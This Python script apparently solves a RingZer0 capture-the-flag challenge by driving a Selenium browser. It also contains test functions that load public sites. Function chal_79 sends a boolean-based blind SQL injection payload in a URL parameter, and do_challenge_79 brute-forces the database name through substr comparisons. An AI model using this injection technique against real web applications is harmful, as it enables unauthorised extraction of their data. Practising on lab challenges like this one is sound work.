import time
from Tools.utils import *
from Tools.BrowserTool import BrowserTool
import Tools.SQLiTool
import Tools.XSSTool
import Tools.CryptoTool
from main import *


def example():
    for i in range(0,10):
        mainBrowserTool.browser.refresh()
        time.sleep(1)
    mainBrowserTool.browser.get("http://www.google.com")
    time.sleep(1)
    mainBrowserTool.browser.get("http://hotmail.com")

def example_get():
    mainBrowserTool.browser.get("http://www.google.com")

example()
time.sleep(1)
example_get()



def chal_79(text):
    mainBrowserTool.browser.get('https://ringzer0team.com/challenges/79/?u=admi" or "(' + text + ')"="1')
    message = mainBrowserTool.browser.find_element_by_class_name('challenge-wrapper').text
    if "does not exists." in message:
        return False
    else:
        return True

def do_challenge_79():
    Tools.SQLiTool.general_brute_force_substr(chal_79, "substr(( SELECT database() ),1,[count])='[letters]'","",number=True,lower=True,upper=True)
